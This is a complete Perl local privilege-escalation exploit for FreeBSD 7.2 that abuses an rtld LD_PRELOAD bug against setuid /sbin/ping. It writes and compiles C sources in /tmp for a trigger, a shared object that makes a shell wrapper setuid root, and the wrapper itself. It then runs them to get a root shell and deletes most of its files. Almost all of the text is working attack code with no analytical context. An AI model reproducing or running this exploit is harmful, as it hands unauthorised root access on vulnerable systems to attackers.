# easy and straight forward FreeBSD 7.2 local root exploit.
# Bug is inside rtld (ELF dyn loader):

sub drop_boomsh
{
	open(O,"&gt;/tmp/boomsh.c") or die $!;
	print O&lt;&lt;_EOB_;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

int main()
{
	char *a[]={"/bin/sh", NULL };
	char *b[]={"/usr/local/bin/bash", NULL };

	setuid(0); setgid(0);
	unlink("/tmp/trigger");
	unlink("/tmp/trigger.c");
	unlink("/tmp/te.so");
	unlink("/tmp/te.c");
	unlink("/tmp/boomsh.c");
	execve(*b, b, NULL);
	execve(*a, a, NULL);
}
_EOB_
	close O;
	system("cc /tmp/boomsh.c -o /tmp/boomsh");
}

sub drop_trigger
{
	open(O,"&gt;/tmp/trigger.c") or die $!;
	print O&lt;&lt;_EOT_;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
	char *a[]={"/sbin/ping", NULL};
	char *e[]={"LD_PRELOAD=/tmp/te.so", "YYY", NULL};
	execve(*a,a,e);
}
_EOT_
	close O;
	system("cc /tmp/trigger.c -o /tmp/trigger");
}

sub drop_teso
{
	open(O, "&gt;/tmp/te.c") or die $!;
	print O&lt;&lt;_EOS_;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

void _init()
{
	chown("/tmp/boomsh", 0, 0);
	chmod("/tmp/boomsh", 04755);
}
_EOS_
	close O;
	system("gcc -fPIC -shared -nostartfiles /tmp/te.c -o /tmp/te.so");
}

print "FreeBSD rtld local root exploit. Need gcc installed. Trying...\n";
drop_boomsh();
drop_teso();
drop_trigger();
system("/tmp/trigger");
exec "/tmp/boomsh";
print "Failed!\n";